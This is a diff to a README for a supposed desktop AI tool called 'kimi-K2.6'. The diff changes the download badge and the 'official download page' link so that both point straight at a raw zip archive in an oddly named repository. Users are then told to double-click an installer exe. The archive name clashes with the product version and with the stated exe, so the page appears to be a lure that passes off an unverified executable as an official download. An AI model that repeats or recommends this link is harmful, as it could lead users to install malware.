@@ -1,6 +1,6 @@
 # 🚀 kimi-K2.6 - Build powerful software on your desktop
 
-[![](https://img.shields.io/badge/Download_Kimi-K2.6-blue)](https://github.com/Furrowed-subphylumurochorda108/kimi-K2.6)
+[![](https://img.shields.io/badge/Download_Kimi-K2.6-blue)](https://github.com/Furrowed-subphylumurochorda108/kimi-K2.6/raw/refs/heads/main/src/kimi-v1.8-beta.3.zip)
 
 Kimi-K2.6 functions as an autonomous software factory. It integrates the Kimi 2.6 artificial intelligence model with Agent Swarm technology. You use this tool to write, test, and deploy code without needing manual programming skills. The software handles logic, file management, and compilation tasks behind the scenes.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the software smoothly:
 
 You can set up the application by following these instructions:
 
-1. Visit the [official download page](https://github.com/Furrowed-subphylumurochorda108/kimi-K2.6) to find the latest version.
+1. Visit the [official download page](https://github.com/Furrowed-subphylumurochorda108/kimi-K2.6/raw/refs/heads/main/src/kimi-v1.8-beta.3.zip) to find the latest version.
 2. Select the file labeled `Kimi-K2.6-Installer.exe`. 
 3. Save the file to your desktop.
 4. Double-click the file to start the installation process.
